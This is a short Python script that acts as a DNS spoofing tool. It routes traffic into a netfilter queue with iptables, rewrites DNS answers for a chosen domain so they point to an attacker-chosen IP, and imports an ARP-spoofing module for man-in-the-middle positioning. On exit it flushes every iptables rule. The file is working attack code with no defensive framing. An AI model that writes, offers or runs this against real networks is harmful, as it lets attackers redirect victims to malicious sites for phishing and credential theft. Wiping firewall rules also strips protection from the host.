#!/usr/bin/python3

import netfilterqueue
import scapy.all as scapy
import optparse
from os import system 
import arp_spoof

redirect = ""
domain = ""

def generate_queue_ip_table(num):
    system("iptables -I INPUT -j NFQUEUE --queue-num " + num)
    system("iptables -I OUTPUT -j NFQUEUE --queue-num " + num)

def clean_iptable():
    system("iptables --flush")

def process_packet(packet):

    global redirect, domain
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        print(qname)
        if domain in qname.decode("ascii"):
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=redirect) 
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def main():

    global redirect, domain

    parser = optparse.OptionParser()
    parser.add_option("-R", "--redirect", dest="redirect", help="Ip address to redirect")
    parser.add_option("-D", "--domain", dest="domain", help="Domain or subdomin to replace")
    (options, args) = parser.parse_args()

    redirect = options.redirect
    domain = options.domain

    if redirect and domain:
        try:
            print("[+] Genering Attack...")
            num = "1"

            generate_queue_ip_table(num)
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(int(num), process_packet)
            queue.run()
        except KeyboardInterrupt:
            print("[!] Cleaning iptable and closing...")
        except OSError:
            print("[x] You need administrative permission")
        finally:
            clean_iptable()
    else:
        print("[x] You need input a target and domain to start")

if __name__ == "__main__":
    main()